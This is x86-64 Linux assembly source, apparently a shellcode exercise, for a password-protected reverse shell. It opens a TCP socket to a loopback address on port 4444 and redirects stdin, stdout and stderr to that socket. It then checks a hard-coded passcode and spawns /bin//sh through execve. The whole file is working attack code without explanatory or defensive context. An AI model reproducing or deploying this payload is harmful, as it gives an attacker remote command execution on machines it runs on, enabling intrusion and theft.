
global _start


_start:

        jmp main
        ask_pass: db "Tell me the passcode", 0xa

main:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 


	mov al, 41
	mov dil, 2
	mov sil, 1
	xor rdx, rdx 
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax
	
	mov dword [rsp-4], 0x0201017f
	mov word [rsp-6], 0x5c11
	mov byte [rsp-8], 0x2
	sub rsp, 8      ; align stack


	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	mov al, 42
	mov rsi, rsp
	mov dl, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)
        
	mov al, 33
        xor rsi, rsi
        syscall

        mov al, 33
        inc rsi
        syscall

        mov al, 33
        inc rsi
        syscall

        ; ############ asking for password ------------------------------

        password:

        ; sys_write
        ; rax : 1 - write syscall number
        ; rdi : unsigned int fd : 1 for stdout
        ; rsi : const char *buf : password buffer
        ; rdx : size_t count : password size
        xor rax, rax
        xor rdx, rdx ; or cqo??
        inc rax
        mov rdi, rax
        lea rsi, [rel ask_pass]
        mov dl, 21
        syscall


        ; sys_read
        ; rdi : unsigned int fd : 0 for stdin
        ; rsi : char *buf : stack?
        ; rdx : size_t count : how big

        xor rdx, rdx
        xor rax, rax
        xor rdi, rdi


        ; rax is already zero
        mov rsi, rsp
        add rdx, 32 ;password size
        syscall

        mov rdi, rsp
        xor rsi, rsi
        push rsi
        mov rsi, 0x646f6f6f676f6e6f
        push rsi
        mov rsi, 0x7470756d61697461
        push rsi
        mov rsi, 0x6874726165777379
        push rsi
        mov rsi, 0x6c6e6d656c6f7369
        push rsi
        mov rsi, rsp    ; password buffer pointer
        xor rcx, rcx
        add cl, 32
        repe cmpsb
        jne password


        ; ###### ------------------------------------------

        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
 

